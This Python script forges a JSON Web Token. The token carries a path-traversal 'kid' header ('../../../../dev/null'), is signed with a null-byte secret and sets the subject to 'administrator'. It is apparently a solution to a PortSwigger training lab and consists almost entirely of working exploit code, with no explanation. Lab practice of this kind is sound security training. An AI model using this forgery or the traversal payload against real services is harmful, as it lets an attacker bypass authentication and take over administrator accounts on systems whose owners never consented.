#!/usr/bin/env python3
import base64
import hashlib
import hmac
import json
def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def b64url_decode(s: str) -> bytes:
    pad = "=" * ((4 - (len(s) % 4)) % 4)
    return base64.urlsafe_b64decode(s + pad)


def sign_hs256_jwt(header: dict, payload: dict, secret_b64: str) -> str:
    secret = base64.b64decode(secret_b64)  # e.g. "AA==" -> b"\x00"

    header_json = json.dumps(header, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    payload_json = json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode("utf-8")

    header_b64 = b64url_encode(header_json)
    payload_b64 = b64url_encode(payload_json)
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)

    return f"{header_b64}.{payload_b64}.{sig_b64}"


def verify_hs256_jwt(token: str, secret_b64: str) -> bool:
    secret = base64.b64decode(secret_b64)
    parts = token.split(".")
    if len(parts) != 3:
        return False
    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
    expected = hmac.new(secret, signing_input, hashlib.sha256).digest()
    expected_b64 = b64url_encode(expected)
    return hmac.compare_digest(parts[2], expected_b64)


if __name__ == "__main__":
    header = {
        "kid": "../../../../../../../../dev/null",
        "alg": "HS256",
        "typ": "JWT",
    }
    payload = {
            "iss": "portswigger",
            "exp": 1772377013,
            "sub": "administrator"
        }
    secret_b64 = "AA==" 
    token = sign_hs256_jwt(header, payload, secret_b64)
    print(token)
    print("verified?", verify_hs256_jwt(token, secret_b64))